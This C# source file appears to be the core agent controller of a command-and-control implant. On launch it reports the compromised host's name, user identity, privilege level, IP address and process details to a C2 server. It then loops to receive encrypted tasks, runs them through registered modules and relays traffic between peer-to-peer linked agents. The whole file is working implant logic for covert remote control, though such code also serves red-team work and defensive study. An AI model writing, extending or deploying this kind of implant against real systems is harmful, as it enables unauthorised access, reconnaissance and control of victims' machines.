using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;

using Shared.Models;

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Agent.Controllers
{
    public class AgentController
    {
        ModuleStatus Status;

        public string AgentID;
        public string ParentAgentID;

        public CryptoController Crypto;

        ICommModule CommModule;
        ConfigController Config;
        PeerToPeerController P2PController;

        List<ModuleInfo> AgentModules = new List<ModuleInfo>();

        public delegate void AgentCommand(string AgentID, AgentTask Task);

        public AgentController(ICommModule CommModule, CryptoController Crypto, ConfigController Config)
        {
            Status = ModuleStatus.Starting;

            this.CommModule = CommModule;
            this.Crypto = Crypto;
            this.Config = Config;

            P2PController = new PeerToPeerController(this);
            P2PController.Start();
        }

        public void RegisterAgentModule(IAgentModule Module)
        {
            Module.Init(this, Config);
            AgentModules.Add(Module.GetModuleInfo());
        }

        public void Start()
        {
            Status = ModuleStatus.Running;

            SendInitialMetadata();

            while (Status == ModuleStatus.Running)
            {
                if (CommModule.RecvData(out AgentMessage Message))
                {
                    if (Message != null && Message.Data != null)
                    {
                        if (Message.AgentID.Equals(AgentID, StringComparison.OrdinalIgnoreCase))
                        {
                            HandleAgentMessage(Message);
                        }
                        else
                        {
                            P2PController.ForwardMessage(Message);
                        }
                    }
                }
            }
        }

        public void HandleAgentMessage(AgentMessage Message)
        {
            var task = Crypto.Decrypt<AgentTask>(Message.Data, Message.IV);

            if (task != null)
            {
                AgentCommand callback = null;

                var module = AgentModules.FirstOrDefault(m => m.Name.Equals(task.Module, StringComparison.OrdinalIgnoreCase));

                if (module == null)
                {
                    SendMessage($"Requested module ({task.Module}) not found");
                }
                else
                {
                    var command = module.Commands.FirstOrDefault(c => c.Name.Equals(task.Command, StringComparison.OrdinalIgnoreCase));

                    if (command == null)
                    {
                        SendMessage($"Requested command ({task.Command}) not found in module {task.Module}");
                    }
                    else
                    {
                        callback = command.Delegate;
                    }
                }

                callback?.Invoke(Message.AgentID, task);
            }
        }

        void SendInitialMetadata()
        {
            var metadata = new AgentMetadata
            {
                AgentID = AgentID,
                ParentAgentID = ParentAgentID,
                Arch = Helpers.GetArchitecture,
                Elevation = Helpers.GetIntegrity,
                Hostname = Helpers.GetHostname,
                Identity = Helpers.GetIdentity,
                IPAddress = Helpers.GetIPAddress,
                PID = Helpers.GetProcessID,
                Process = Helpers.GetProcessName,
            };

            var c2Data = new C2Data
            {
                Module = "Core",
                Command = "InitialCheckin",
                Data = Shared.Utilities.Utilities.SerialiseData(metadata)
            };

            SendMessage(c2Data);
        }

        public void SendMessage(C2Data C2Data)
        {
            var data = Crypto.Encrypt(C2Data, out byte[] iv);

            CommModule.SendData(new AgentMessage
            {
                AgentID = AgentID,
                Data = data,
                IV = iv
            });
        }

        public void SendMessage(AgentMessage Message)
        {
            CommModule.SendData(Message);
        }

        public void SendMessage(string Module, string Command, string Data)
        {
            var c2Data = Crypto.Encrypt(new C2Data
            {
                Module = Module,
                Command = Command,
                Data = Encoding.UTF8.GetBytes(Data)
            },
            out byte[] iv);

            CommModule.SendData(new AgentMessage
            {
                AgentID = AgentID,
                Data = c2Data,
                IV = iv
            });
        }

        public void SendMessage(string Module, string Command, byte[] Data)
        {
            var c2Data = Crypto.Encrypt(new C2Data
            {
                Module = Module,
                Command = Command,
                Data = Data
            },
            out byte[] iv);

            CommModule.SendData(new AgentMessage
            {
                AgentID = AgentID,
                Data = c2Data,
                IV = iv
            });
        }

        public void SendMessage(string Data)
        {
            var c2Data = Crypto.Encrypt(new C2Data
            {
                Module = "Core",
                Command = "AgentOutput",
                Data = Encoding.UTF8.GetBytes(Data)
            },
            out byte[] iv);

            CommModule.SendData(new AgentMessage
            {
                AgentID = AgentID,
                Data = c2Data,
                IV = iv
            });
        }

        public void SendError(string Error)
        {
            var c2Data = Crypto.Encrypt(new C2Data
            {
                Module = "Core",
                Command = "AgentError",
                Data = Encoding.UTF8.GetBytes(Error)
            },
            out byte[] iv);

            CommModule.SendData(new AgentMessage
            {
                AgentID = AgentID,
                Data = c2Data,
                IV = iv
            });
        }

        public void AddP2PAgent(ICommModule CommModule)
        {
            P2PController.LinkAgent(CommModule);
        }

        public void UpdateP2PPlaceholder(string Placeholder, string AgentID)
        {
            P2PController.UpdatePlaceholder(Placeholder, AgentID);
        }

        public void Stop()
        {
            Status = ModuleStatus.Stopped;
        }
    }
}